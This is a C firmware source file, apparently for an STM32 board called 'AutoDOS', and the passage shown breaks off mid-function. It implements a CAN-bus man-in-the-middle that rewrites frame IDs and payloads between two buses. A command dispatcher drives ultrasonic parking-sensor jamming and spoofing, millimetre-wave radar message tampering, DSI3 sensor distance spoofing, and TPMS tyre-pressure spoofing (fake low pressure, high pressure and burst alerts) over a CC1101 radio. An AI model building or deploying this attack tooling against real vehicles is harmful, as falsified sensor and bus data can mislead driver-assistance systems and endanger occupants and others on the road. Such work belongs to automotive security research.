/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : AutoDOS Integrated Firmware - Main program body
  *                   Integrated with CAN man-in-the-middle, ultrasonic radar attack, and millimeter-wave radar attack functionalities
  ******************************************************************************
  * @attention
  *
  * Copyright (c) 2023 STMicroelectronics.
  * All rights reserved.
  *
  * This software is licensed under terms that can be found in the LICENSE file
  * in the root directory of this software component.
  * If no LICENSE file comes with this software, it is provided AS-IS.
  *
  ******************************************************************************
  */
/* USER CODE END Header */
/* Includes ------------------------------------------------------------------*/
#include "main.h"
#include "uss_attack.h"
#include "mmwave_attack.h"
#include "dsi3_control.h"
#include "tpms_cc1101.h"

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */
#include "stdlib.h"
#include "string.h"
/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */

#define NUMBER_OF_SLOT   7

typedef struct {
    uint32_t id_mask;
    uint64_t data_mask;
    uint8_t length;

    uint32_t id_t;
    uint64_t data_t;

    uint8_t id_cg;
    uint8_t data_cg;

    uint32_t id_tg;
    uint8_t length_tg;
    uint64_t data_tg;
}sl;
/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */

#ifndef HSEM_ID_0
#define HSEM_ID_0 (0U) /* HW semaphore 0*/
#endif

/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */

/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/

FDCAN_HandleTypeDef hfdcan1;
FDCAN_HandleTypeDef hfdcan2;

SPI_HandleTypeDef hspi6;   // 用于通信和DSI3
SPI_HandleTypeDef hspi3;   // 用于CC1101（TPMS）

PCD_HandleTypeDef hpcd_USB_OTG_FS;

TIM_HandleTypeDef htim1;  // 用于超声波PWM输出
ADC_HandleTypeDef hadc1;  // 用于超声波回波检测

/* USER CODE BEGIN PV */

USBD_HandleTypeDef USBD_Device;
extern __IO uint8_t bUsbDeviceState;		

__attribute__((aligned(8))) uint8_t rxbuf[64];
uint32_t filllevel = 0;
FDCAN_RxHeaderTypeDef rxheader;
FDCAN_TxHeaderTypeDef txheader;

uint32_t lsttick = 0;
uint32_t can_buf_pos = 0;
uint8_t can_tx_buf[512];

uint8_t comm_rx_buf[1024];
uint8_t comm_tx_buf[1024];

sl slot[NUMBER_OF_SLOT];

uint8_t gpio_v;

// 超声波攻击控制变量
uint8_t uss_attack_mode = 0;  // 0=关闭, 1=干扰, 2=欺骗
uint8_t mmwave_attack_enable = 0;  // 毫米波雷达攻击使能

// DSI3控制变量
uint8_t dsi3_enabled = 0;  // DSI3功能使能

// TPMS控制变量
uint8_t tpms_enabled = 0;  // TPMS功能使能

/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_FDCAN1_Init(void);
static void MX_FDCAN2_Init(void);
static void MX_SPI6_Init(void);
static void MX_SPI3_Init(void);  // CC1101 SPI
static void MX_USB_OTG_FS_PCD_Init(void);
static void MX_TIM1_Init(void);  // 超声波PWM定时器
static void MX_ADC1_Init(void);  // 超声波ADC

/* USER CODE BEGIN PFP */
void comp_mod(FDCAN_RxHeaderTypeDef *rx_header, uint64_t *rx_data);
void print_to_buf();
void resolve(uint8_t* dat, uint16_t len);
int32_t comm_x(uint8_t* data, uint16_t len);
void comm_spi(uint8_t* data, uint16_t len);
void comm_usb(uint8_t* data, uint16_t len);
void process_attack_commands(uint8_t* data, uint16_t len);

/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */

void usb_state_detect(void) {
	static uint8_t usbstatus=0;	
	if(usbstatus != bUsbDeviceState) // usb connect state has been changed
	{
		usbstatus=bUsbDeviceState;
		if(usbstatus==1)
		{
			BSP_LED_On(LED1); // LED1 on represent usb connect
		}else
		{
			BSP_LED_Off(LED1);  // LED1 off represent usb disconnect
		}
	}
}

// 篡改数据
void comp_mod(FDCAN_RxHeaderTypeDef *rx_header, uint64_t *rx_data){
    for(int i=0;i<NUMBER_OF_SLOT;i++){
			
		if (slot[i].id_cg == 0 && slot[i].data_cg == 0) continue;
				
		int pass = 0;
		if(((rx_header->Identifier ^ slot[i].id_t) & slot[i].id_mask) == 0){
					
			if(slot[i].length == 0x08 || slot[i].length == rx_header->DataLength){   // id 符合条件
						
				uint64_t rst1;
				uint64_t rst2;
				rst1 = *rx_data ^ slot[i].data_t;
				rst2 = rst1 & slot[i].data_mask;
				if((rst2) == 0){
							
					pass = 1;  // 进行数据对比，数据对比符合条件
				}
			}
		}

		if(pass){  // ID 和数据均符合篡改条件
			if(slot[i].id_cg){
				rx_header->Identifier = slot[i].id_tg;   // 篡改ID
			}
			if(slot[i].data_cg){
				*rx_data = slot[i].data_tg;
			}
			
			// 如果是毫米波雷达消息且攻击使能，进行额外处理
			if(mmwave_attack_enable) {
				mmwave_process_message(rx_header, rx_data);
			}
		}
    }
}

// 封装一个数据包
void print_to_buf(){
	if(can_buf_pos < 420){
		uint8_t len = 0xFF&(rxheader.DataLength >> 16);   // get DataLength's  16~24
		
		switch(len){
			case 9 : len = 12;break;
			case 10: len = 16;break;
			case 11: len = 20;break;
			case 12: len = 24;break;
			case 13: len = 32;break;
			case 14: len = 48;break;
			case 15: len = 64;break;
			default: break;
		}
		
		can_tx_buf[can_buf_pos]=0xFA; can_buf_pos++;
		can_tx_buf[can_buf_pos]=0x51; can_buf_pos++;
		can_tx_buf[can_buf_pos]=0x00; can_buf_pos++;
		
		memcpy(can_tx_buf+can_buf_pos,&(rxheader.RxTimestamp),4); can_buf_pos+=4;
		memcpy(can_tx_buf+can_buf_pos,&(rxheader.Identifier),4); can_buf_pos+=4;
		can_tx_buf[can_buf_pos]=len; can_buf_pos++;
		
		memcpy(can_tx_buf+can_buf_pos,rxbuf, len); can_buf_pos += len;
		
		can_tx_buf[can_buf_pos]=0x52; can_buf_pos++;
		can_tx_buf[can_buf_pos]=0xFB; can_buf_pos++;
	}
}	

// 解析数据包
int cnt = 0;
void resolve(uint8_t* dat, uint16_t len){
	// 处理攻击命令
	if(len >= 3 && dat[0] == 0xFA && dat[1] == 0x30) {
		process_attack_commands(dat, len);
		return;
	}
	
	// 处理CAN篡改配置
    if(len != 45)return;

    if(dat[0]==0xFA && dat[1]==0x21 && dat[43] ==0x22 && dat[44]==0xFB){
        memcpy(&slot[dat[2]].id_mask, &dat[3], 4);
        memcpy(&slot[dat[2]].data_mask, &dat[7], 8);
        slot[dat[2]].length = dat[15];
        memcpy(&slot[dat[2]].id_t, &dat[16], 4);
        memcpy(&slot[dat[2]].data_t, &dat[20], 8);
        slot[dat[2]].id_cg = dat[28];
        slot[dat[2]].data_cg = dat[29];
        memcpy(&slot[dat[2]].id_tg, &dat[30], 4);
        slot[dat[2]].length_tg = dat[34];
        memcpy(&slot[dat[2]].data_tg, &dat[35], 8);
    }
}

// 处理攻击命令
void process_attack_commands(uint8_t* data, uint16_t len) {
	if(len < 4) return;
	
	uint8_t cmd = data[2];
	uint8_t param = data[3];
	
	switch(cmd) {
		case 0x01:  // 超声波攻击控制
			uss_attack_mode = param;
			if(param == 1) {
				// 干扰模式：持续输出48kHz
				uss_jamming_start();
			} else if(param == 2) {
				// 欺骗模式：检测回波并延迟发射
				uss_spoof_start();
			} else {
				// 关闭
				uss_attack_stop();
			}
			break;
			
		case 0x02:  // 毫米波雷达攻击控制
			mmwave_attack_enable = param;
			break;
			
		case 0x03:  // 超声波欺骗参数设置
			if(len >= 6) {
				uint16_t delay_cm = (data[4] << 8) | data[5];
				uss_set_spoof_delay(delay_cm);
			}
			break;
			
		case 0x04:  // DSI3控制
			if(len >= 5) {
				uint8_t dsi3_cmd = data[3];
				uint8_t sensor_id = data[4];
				
				if(dsi3_cmd == 0x01) {  // 启动嗅探
					dsi3_sniff_start(sensor_id);
					dsi3_enabled = 1;
				} else if(dsi3_cmd == 0x02) {  // 欺骗距离
					if(len >= 7) {
						uint16_t fake_dist = (data[5] << 8) | data[6];
						dsi3_spoof_distance(sensor_id, fake_dist);
						dsi3_enabled = 1;
					}
				} else if(dsi3_cmd == 0x03) {  // 启动干扰
					dsi3_jamming_start(sensor_id);
					dsi3_enabled = 1;
				} else if(dsi3_cmd == 0x00) {  // 停止
					dsi3_jamming_stop(sensor_id);
					dsi3_set_mode(sensor_id, DSI3_MODE_NORMAL);
				}
			}
			break;
			
		case 0x05:  // TPMS控制
			if(len >= 5) {
				uint8_t tpms_cmd = data[3];
				uint8_t position = data[4];
				
				if(tpms_cmd == 0x01) {  // 设置传感器ID
					if(len >= 9) {
						uint32_t sensor_id = (data[5] << 24) | (data[6] << 16) | (data[7] << 8) | data[8];
						tpms_set_sensor_id(position, sensor_id);
					}
				} else if(tpms_cmd == 0x02) {  // 欺骗胎压
					if(len >= 8) {
						uint16_t pressure = (data[5] << 8) | data[6];
						uint8_t temp = data[7];
						tpms_spoof_pressure(position, pressure, temp);
						tpms_enabled = 1;
					}
				} else if(tpms_cmd == 0x03) {  // 低胎压警告
					tpms_spoof_low_pressure(position);
					tpms_enabled = 1;
				} else if(tpms_cmd == 0x04) {  // 高胎压警告
					tpms_spoof_high_pressure(position);
					tpms_enabled = 1;
				} else if(tpms_cmd == 0x05) {  // 爆胎
					tpms_spoof_burst(position);
					tpms_enabled = 1;
				} else if(tpms_cmd == 0x06) {  // 启动嗅探
					tpms_sniff_start();
					tpms_enabled = 1;
				}
			}
			break;
	}
}

// external communication
int32_t comm_x(uint8_t* data, uint16_t len) {
	if(len > 200){
		comm_tx_buf[0] = len>>8;            
		comm_tx_buf[1] = len & 0xFF;   
		comm_tx_buf[2] =0;
		comm_tx_buf[3] =0;
		
		memcpy(comm_tx_buf+4,data,len);
		
		if(len<64) len = 64;
		
		comm_spi(comm_tx_buf, len);
		comm_usb(comm_tx_buf, len);
		
		return 1;
	}
	return 0;
}

void comm_spi(uint8_t* data, uint16_t len){
	HAL_SPI_TransmitReceive(&hspi6,comm_tx_buf,comm_rx_buf,len + 4,len/1000 + 10);
	if(((uint16_t*)comm_rx_buf)[0] != 0){
		resolve(comm_rx_buf+4,*(uint16_t*)comm_rx_buf);
	}
}

void comm_usb(uint8_t* data, uint16_t len){
	if (bUsbDeviceState==0) return;
	
	VCP_DataTx(comm_tx_buf, len + 4);
	if(USB_USART_RX_STA&0x8000) {
		uint16_t rx_len = USB_USART_RX_STA&0x3FFF;
		resolve(USB_USART_RX_BUF, rx_len);  
		USB_USART_RX_STA=0;
	}	
}

/* USER CODE END 0 */

/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
  /* USER CODE BEGIN 1 */

  /* USER CODE END 1 */
/* USER CODE BEGIN Boot_Mode_Sequence_0 */
  int32_t timeout;
/* USER CODE END Boot_Mode_Sequence_0 */

/* USER CODE BEGIN Boot_Mode_Sequence_1 */
  /* Wait until CPU2 boots and enters in stop mode or timeout*/
	
  timeout = 0xFFFF;
  while((__HAL_RCC_GET_FLAG(RCC_FLAG_D2CKRDY) != RESET) && (timeout-- > 0));
  if ( timeout < 0 )
  {
		Error_Handler();
  }
	
/* USER CODE END Boot_Mode_Sequence_1 */
  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();

  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
/* USER CODE BEGIN Boot_Mode_Sequence_2 */
	/* When system initialization is finished, Cortex-M7 will release Cortex-M4 by means of HSEM notification */
	/*HW semaphore Clock enable*/
	__HAL_RCC_HSEM_CLK_ENABLE();
	/*Take HSEM */
	HAL_HSEM_FastTake(HSEM_ID_0);
	/*Release HSEM in order to notify the CPU2(CM4)*/
	HAL_HSEM_Release(HSEM_ID_0,0);
	/* wait until CPU2 wakes up from stop mode */
	
	timeout = 0xFFFF;
	while((__HAL_RCC_GET_FLAG(RCC_FLAG_D2CKRDY) == RESET) && (timeout-- > 0));
	if ( timeout < 0 )
	{
		Error_Handler();
	}
	
/* USER CODE END Boot_Mode_Sequence_2 */

  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
  MX_FDCAN1_Init();
  MX_FDCAN2_Init();
  MX_SPI6_Init();
  MX_SPI3_Init();  // 初始化CC1101 SPI
  MX_TIM1_Init();  // 初始化超声波PWM定时器
  MX_ADC1_Init();  // 初始化超声波ADC
  /* USER CODE BEGIN 2 */
	
	for(int i=0;i<NUMBER_OF_SLOT;i++){
		slot[i].id_t = 0;
		slot[i].id_mask = 0;
		slot[i].data_mask = 0;
	}
	
	
	FDCAN_FilterTypeDef  sFilterConfig;

	sFilterConfig.IdType = FDCAN_STANDARD_ID;
	sFilterConfig.FilterIndex = 0;
	sFilterConfig.FilterType = FDCAN_FILTER_MASK;
	sFilterConfig.FilterConfig = FDCAN_FILTER_TO_RXFIFO0;
	sFilterConfig.FilterID1 = 0;
	sFilterConfig.FilterID2 = 0;
	HAL_FDCAN_ConfigFilter(&hfdcan1, &sFilterConfig);
	HAL_FDCAN_ConfigFilter(&hfdcan2, &sFilterConfig);
	
	
	HAL_FDCAN_Start(&hfdcan1);
	HAL_FDCAN_Start(&hfdcan2);
	
	/* Init Device Library */
	HAL_PWREx_EnableUSBVoltageDetector();
  USBD_Init(&USBD_Device, &VCP_Desc, 0);
	/* Add Supported Class */
  USBD_RegisterClass(&USBD_Device, USBD_CDC_CLASS);
	/* Add CDC Interface Class */
  USBD_CDC_RegisterInterface(&USBD_Device, &USBD_CDC_fops);
	
	/* Start Device Process */
  USBD_Start(&USBD_Device);
	
	// 初始化超声波攻击模块
	uss_attack_init(&htim1, &hadc1);
	
	// 初始化毫米波雷达攻击模块
	mmwave_attack_init();
	
	// 初始化DSI3控制模块（使用SPI6，CS引脚需要根据硬件配置）
	// 注意：需要根据实际硬件连接调整CS引脚
	// dsi3_control_init(&hspi6, GPIOB, GPIO_PIN_0);  // 示例：使用PB0作为DSI3 CS
	
	// 初始化TPMS CC1101模块（使用SPI3，CS和GDO0引脚需要根据硬件配置）
	// 注意：需要根据实际硬件连接调整引脚
	// tpms_cc1101_init(&hspi3, GPIOB, GPIO_PIN_1, GPIOB, GPIO_PIN_2);  // 示例：PB1=CS, PB2=GDO0
	
	BSP_LED_Off(LED1);
	BSP_LED_Off(LED2);
	BSP_LED_Off(LED3);
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
	uint32_t times=0;    
  while (1)
  {
		times = HAL_GetTick();
		
		if(times%100==0) BSP_LED_Toggle(LED2);  // LED2 闪烁表明系统正在运行
		usb_state_detect();
		
		// 处理CAN1接收
		filllevel = HAL_FDCAN_GetRxFifoFillLevel(&hfdcan1,FDCAN_RX_FIFO0);
		if (filllevel)
		{
			HAL_FDCAN_GetRxMessage(&hfdcan1, FDCAN_RX_FIFO0, &rxheader, rxbuf);
			
			//print it 
			print_to_buf();
			//modify then send it to can2
			comp_mod(&rxheader,(uint64_t*)rxbuf);
			
			txheader.BitRateSwitch = rxheader.BitRateSwitch;
			txheader.DataLength = rxheader.DataLength;
			txheader.ErrorStateIndicator = rxheader.ErrorStateIndicator;
			txheader.FDFormat = rxheader.FDFormat;
			txheader.Identifier = rxheader.Identifier;
			txheader.IdType = rxheader.IdType;
			
			txheader.TxFrameType = rxheader.RxFrameType;
			txheader.MessageMarker = 0;
			txheader.TxEventFifoControl = FDCAN_NO_TX_EVENTS;
			HAL_FDCAN_AddMessageToTxFifoQ(&hfdcan2,&txheader,rxbuf);
		}
		
		// 处理CAN2接收
		filllevel = HAL_FDCAN_GetRxFifoFillLevel(&hfdcan2,FDCAN_RX_FIFO0);
		if (filllevel)
		{
			HAL_FDCAN_GetRxMessage(&hfdcan2, FDCAN_RX_FIFO0, &rxheader, rxbuf);
			
			//print it 
			print_to_buf();
			//modify then send it to can1
			
			comp_mod(&rxheader,(uint64_t*)rxbuf);
			
			txheader.BitRateSwitch = rxheader.BitRateSwitch;
			txheader.DataLength = rxheader.DataLength;
			txheader.ErrorStateIndicator = rxheader.ErrorStateIndicator;
			txheader.FDFormat = rxheader.FDFormat;
			txheader.Identifier = rxheader.Identifier;
			txheader.IdType = rxheader.IdType;
			
			txheader.TxFrameType = rxheader.RxFrameType;
			txheader.MessageMarker = 0;
			txheader.TxEventFifoControl = FDCAN_NO_TX_EVENTS;
			HAL_FDCAN_AddMessageToTxFifoQ(&hfdcan1,&txheader,rxbuf);
		}
		
		// 发送CAN数据包
		if(comm_x(can_tx_buf,can_buf_pos)) can_buf_pos = 0;
		
		// 处理超声波攻击
		if(uss_attack_mode > 0) {
			uss_attack_process();
		}
		
		// 处理DSI3模块
		if(dsi3_enabled) {
			dsi3_process();
		}
		
		// 处理TPMS模块
		if(tpms_enabled) {
			tpms_process();
		}
		
    /* USER CODE END WHILE */

    /* USER CODE BEGIN 3 */
  }
  /* USER CODE END 3 */
}

/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};

  /** Supply configuration update enable
  */
  HAL_PWREx_ConfigSupply(PWR_LDO_SUPPLY);

  /** Configure the main internal regulator output voltage
  */
  __HAL_PWR_VOLTAGESCALING_CONFIG(PWR_REGULATOR_VOLTAGE_SCALE1);

  while(!__HAL_PWR_GET_FLAG(PWR_FLAG_VOSRDY)) {}

  __HAL_RCC_SYSCFG_CLK_ENABLE();
  __HAL_PWR_VOLTAGESCALING_CONFIG(PWR_REGULATOR_VOLTAGE_SCALE0);

  while(!__HAL_PWR_GET_FLAG(PWR_FLAG_VOSRDY)) {}

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSI48|RCC_OSCILLATORTYPE_HSI;
  RCC_OscInitStruct.HSIState = RCC_HSI_DIV1;
  RCC_OscInitStruct.HSICalibrationValue = RCC_HSICALIBRATION_DEFAULT;
  RCC_OscInitStruct.HSI48State = RCC_HSI48_ON;
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_HSI;
  RCC_OscInitStruct.PLL.PLLM = 16;
  RCC_OscInitStruct.PLL.PLLN = 240;
  RCC_OscInitStruct.PLL.PLLP = 2;
  RCC_OscInitStruct.PLL.PLLQ = 8;
  RCC_OscInitStruct.PLL.PLLR = 8;
  RCC_OscInitStruct.PLL.PLLRGE = RCC_PLL1VCIRANGE_2;
  RCC_OscInitStruct.PLL.PLLVCOSEL = RCC_PLL1VCOWIDE;
  RCC_OscInitStruct.PLL.PLLFRACN = 0;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
  {
    Error_Handler();
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2
                              |RCC_CLOCKTYPE_D3PCLK1|RCC_CLOCKTYPE_D1PCLK1;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
  RCC_ClkInitStruct.SYSCLKDivider = RCC_SYSCLK_DIV1;
  RCC_ClkInitStruct.AHBCLKDivider = RCC_HCLK_DIV2;
  RCC_ClkInitStruct.APB3CLKDivider = RCC_APB3_DIV2;
  RCC_ClkInitStruct.APB1CLKDivider = RCC_APB1_DIV2;
  RCC_ClkInitStruct.APB2CLKDivider = RCC_APB2_DIV2;
  RCC_ClkInitStruct.APB4CLKDivider = RCC_APB4_DIV2;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_4) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief FDCAN1 Initialization Function
  * @param None
  * @retval None
  */
static void MX_FDCAN1_Init(void)
{
  hfdcan1.Instance = FDCAN1;
  hfdcan1.Init.FrameFormat = FDCAN_FRAME_CLASSIC;
  hfdcan1.Init.Mode = FDCAN_MODE_NORMAL;
  hfdcan1.Init.AutoRetransmission = DISABLE;
  hfdcan1.Init.TransmitPause = DISABLE;
  hfdcan1.Init.ProtocolException = DISABLE;
  hfdcan1.Init.NominalPrescaler = 24;
  hfdcan1.Init.NominalSyncJumpWidth = 1;
  hfdcan1.Init.NominalTimeSeg1 = 2;
  hfdcan1.Init.NominalTimeSeg2 = 2;
  hfdcan1.Init.DataPrescaler = 1;
  hfdcan1.Init.DataSyncJumpWidth = 1;
  hfdcan1.Init.DataTimeSeg1 = 1;
  hfdcan1.Init.DataTimeSeg2 = 1;
  hfdcan1.Init.MessageRAMOffset = 0;
  hfdcan1.Init.StdFiltersNbr = 1;
  hfdcan1.Init.ExtFiltersNbr = 0;
  hfdcan1.Init.RxFifo0ElmtsNbr = 16;
  hfdcan1.Init.RxFifo0ElmtSize = FDCAN_DATA_BYTES_8;
  hfdcan1.Init.RxFifo1ElmtsNbr = 0;
  hfdcan1.Init.RxFifo1ElmtSize = FDCAN_DATA_BYTES_8;
  hfdcan1.Init.RxBuffersNbr = 0;
  hfdcan1.Init.RxBufferSize = FDCAN_DATA_BYTES_8;
  hfdcan1.Init.TxEventsNbr = 0;
  hfdcan1.Init.TxBuffersNbr = 0;
  hfdcan1.Init.TxFifoQueueElmtsNbr = 16;
  hfdcan1.Init.TxFifoQueueMode = FDCAN_TX_FIFO_OPERATION;
  hfdcan1.Init.TxElmtSize = FDCAN_DATA_BYTES_8;
  if (HAL_FDCAN_Init(&hfdcan1) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief FDCAN2 Initialization Function
  * @param None
  * @retval None
  */
static void MX_FDCAN2_Init(void)
{
  hfdcan2.Instance = FDCAN2;
  hfdcan2.Init.FrameFormat = FDCAN_FRAME_CLASSIC;
  hfdcan2.Init.Mode = FDCAN_MODE_NORMAL;
  hfdcan2.Init.AutoRetransmission = DISABLE;
  hfdcan2.Init.TransmitPause = DISABLE;
  hfdcan2.Init.ProtocolException = DISABLE;
  hfdcan2.Init.NominalPrescaler = 24;
  hfdcan2.Init.NominalSyncJumpWidth = 1;
  hfdcan2.Init.NominalTimeSeg1 = 2;
  hfdcan2.Init.NominalTimeSeg2 = 2;
  hfdcan2.Init.DataPrescaler = 1;
  hfdcan2.Init.DataSyncJumpWidth = 1;
  hfdcan2.Init.DataTimeSeg1 = 1;
  hfdcan2.Init.DataTimeSeg2 = 1;
  hfdcan2.Init.MessageRAMOffset = 0;
  hfdcan2.Init.StdFiltersNbr = 0;
  hfdcan2.Init.ExtFiltersNbr = 0;
  hfdcan2.Init.RxFifo0ElmtsNbr = 16;
  hfdcan2.Init.RxFifo0ElmtSize = FDCAN_DATA_BYTES_8;
  hfdcan2.Init.RxFifo1ElmtsNbr = 0;
  hfdcan2.Init.RxFifo1ElmtSize = FDCAN_DATA_BYTES_8;
  hfdcan2.Init.RxBuffersNbr = 0;
  hfdcan2.Init.RxBufferSize = FDCAN_DATA_BYTES_8;
  hfdcan2.Init.TxEventsNbr = 0;
  hfdcan2.Init.TxBuffersNbr = 0;
  hfdcan2.Init.TxFifoQueueElmtsNbr = 16;
  hfdcan2.Init.TxFifoQueueMode = FDCAN_TX_FIFO_OPERATION;
  hfdcan2.Init.TxElmtSize = FDCAN_DATA_BYTES_8;
  if (HAL_FDCAN_Init(&hfdcan2) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief SPI6 Initialization Function
  * @param None
  * @retval None
  */
static void MX_SPI6_Init(void)
{
  hspi6.Instance = SPI6;
  hspi6.Init.Mode = SPI_MODE_MASTER;
  hspi6.Init.Direction = SPI_DIRECTION_2LINES;
  hspi6.Init.DataSize = SPI_DATASIZE_8BIT;
  hspi6.Init.CLKPolarity = SPI_POLARITY_LOW;
  hspi6.Init.CLKPhase = SPI_PHASE_1EDGE;
  hspi6.Init.NSS = SPI_NSS_SOFT;  // 软件NSS，用于DSI3
  hspi6.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_32;
  hspi6.Init.FirstBit = SPI_FIRSTBIT_MSB;
  hspi6.Init.TIMode = SPI_TIMODE_DISABLE;
  hspi6.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
  hspi6.Init.CRCPolynomial = 0x0;
  hspi6.Init.NSSPMode = SPI_NSS_PULSE_DISABLE;
  hspi6.Init.NSSPolarity = SPI_NSS_POLARITY_LOW;
  hspi6.Init.FifoThreshold = SPI_FIFO_THRESHOLD_01DATA;
  hspi6.Init.TxCRCInitializationPattern = SPI_CRC_INITIALIZATION_ALL_ZERO_PATTERN;
  hspi6.Init.RxCRCInitializationPattern = SPI_CRC_INITIALIZATION_ALL_ZERO_PATTERN;
  hspi6.Init.MasterSSIdleness = SPI_MASTER_SS_IDLENESS_08CYCLE;
  hspi6.Init.MasterInterDataIdleness = SPI_MASTER_INTERDATA_IDLENESS_01CYCLE;
  hspi6.Init.MasterReceiverAutoSusp = SPI_MASTER_RX_AUTOSUSP_DISABLE;
  hspi6.Init.MasterKeepIOState = SPI_MASTER_KEEP_IO_STATE_DISABLE;
  hspi6.Init.IOSwap = SPI_IO_SWAP_DISABLE;
  if (HAL_SPI_Init(&hspi6) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief SPI3 Initialization Function - 用于CC1101
  * @param None
  * @retval None
  */
static void MX_SPI3_Init(void)
{
  hspi3.Instance = SPI3;
  hspi3.Init.Mode = SPI_MODE_MASTER;
  hspi3.Init.Direction = SPI_DIRECTION_2LINES;
  hspi3.Init.DataSize = SPI_DATASIZE_8BIT;
  hspi3.Init.CLKPolarity = SPI_POLARITY_LOW;
  hspi3.Init.CLKPhase = SPI_PHASE_1EDGE;
  hspi3.Init.NSS = SPI_NSS_SOFT;  // 软件NSS，用于CC1101
  hspi3.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_8;  // 较高速度用于CC1101
  hspi3.Init.FirstBit = SPI_FIRSTBIT_MSB;
  hspi3.Init.TIMode = SPI_TIMODE_DISABLE;
  hspi3.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
  hspi3.Init.CRCPolynomial = 0x0;
  hspi3.Init.NSSPMode = SPI_NSS_PULSE_DISABLE;
  hspi3.Init.NSSPolarity = SPI_NSS_POLARITY_LOW;
  hspi3.Init.FifoThreshold = SPI_FIFO_THRESHOLD_01DATA;
  hspi3.Init.TxCRCInitializationPattern = SPI_CRC_INITIALIZATION_ALL_ZERO_PATTERN;
  hspi3.Init.RxCRCInitializationPattern = SPI_CRC_INITIALIZATION_ALL_ZERO_PATTERN;
  hspi3.Init.MasterSSIdleness = SPI_MASTER_SS_IDLENESS_08CYCLE;
  hspi3.Init.MasterInterDataIdleness = SPI_MASTER_INTERDATA_IDLENESS_01CYCLE;
  hspi3.Init.MasterReceiverAutoSusp = SPI_MASTER_RX_AUTOSUSP_DISABLE;
  hspi3.Init.MasterKeepIOState = SPI_MASTER_KEEP_IO_STATE_DISABLE;
  hspi3.Init.IOSwap = SPI_IO_SWAP_DISABLE;
  if (HAL_SPI_Init(&hspi3) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief USB_OTG_FS Initialization Function
  * @param None
  * @retval None
  */
static void MX_USB_OTG_FS_PCD_Init(void)
{
  hpcd_USB_OTG_FS.Instance = USB_OTG_FS;
  hpcd_USB_OTG_FS.Init.dev_endpoints = 9;
  hpcd_USB_OTG_FS.Init.speed = PCD_SPEED_FULL;
  hpcd_USB_OTG_FS.Init.dma_enable = DISABLE;
  hpcd_USB_OTG_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
  hpcd_USB_OTG_FS.Init.Sof_enable = DISABLE;
  hpcd_USB_OTG_FS.Init.low_power_enable = DISABLE;
  hpcd_USB_OTG_FS.Init.lpm_enable = DISABLE;
  hpcd_USB_OTG_FS.Init.battery_charging_enable = DISABLE;
  hpcd_USB_OTG_FS.Init.vbus_sensing_enable = DISABLE;
  hpcd_USB_OTG_FS.Init.use_dedicated_ep1 = DISABLE;
  if (HAL_PCD_Init(&hpcd_USB_OTG_FS) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief TIM1 Initialization Function - 用于超声波PWM输出
  * @param None
  * @retval None
  */
static void MX_TIM1_Init(void)
{
  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
  TIM_MasterConfigTypeDef sMasterConfig = {0};
  TIM_OC_InitTypeDef sConfigOC = {0};
  TIM_BreakDeadTimeConfigTypeDef sBreakDeadTimeConfig = {0};

  htim1.Instance = TIM1;
  htim1.Init.Prescaler = 0;
  htim1.Init.CounterMode = TIM_COUNTERMODE_UP;
  htim1.Init.Period = 333;  // 48kHz: 240MHz / 48000 = 5000, 但需要根据实际时钟调整
  htim1.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
  htim1.Init.RepetitionCounter = 0;
  htim1.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
  if (HAL_TIM_Base_Init(&htim1) != HAL_OK)
  {
    Error_Handler();
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
  if (HAL_TIM_ConfigClockSource(&htim1, &sClockSourceConfig) != HAL_OK)
  {
    Error_Handler();
  }
  if (HAL_TIM_PWM_Init(&htim1) != HAL_OK)
  {
    Error_Handler();
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
